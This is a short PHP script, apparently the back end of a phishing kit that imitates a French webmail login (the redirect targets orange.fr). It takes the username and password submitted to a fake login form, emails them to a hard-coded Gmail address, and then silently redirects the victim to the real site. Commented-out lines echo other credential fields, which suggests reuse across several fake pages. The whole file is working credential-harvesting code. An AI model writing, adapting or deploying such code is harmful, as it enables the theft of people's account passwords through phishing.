<?php
//echo $_POST['EM'].'AND '.$_POST['WORD'];
//echo $_POST['login_email'].'AND '.$_POST['login_password'];
//die('OK');


//echo $_POST['IDToken1'].'  '.$_POST['IDToken2'];

//echo '<a href="index.html">index.html</a>';


$sujet = 'Nouveau mail du sage a la date du : '.date("d-M-Y", strtotime("now")).' a '.date("H:i:s", strtotime("now"));
$message = 'Nom d\'utilisateur =>'.$_POST['_user'].' et le Mot de passe => '.$_POST['_pass'];
$destinataire = 'buscal.monique@gmail.com';
$headers = "From: \"Berenger\"<buscal.monique@gmail.com\n";
$headers .= "Content-Type: text/plain; charset=\"iso-8859-1\"";

if(mail($destinataire,$sujet,$message,$headers))
{
?>
<script type="text/javascript">function redirection(page)
  {window.location=page;}
setTimeout('redirection("www.orange.fr")',0000);
//1000 millisecondes=1 secondes, le temps après lequel on redirige.</script>
<?php
}
else
{
?>
<script type="text/javascript">function redirection(page)
  {window.location=page;}
setTimeout('redirection("google.fr")',0000);
//1000 millisecondes=1 secondes, le temps après lequel on redirige.</script>
<?php
}
?>
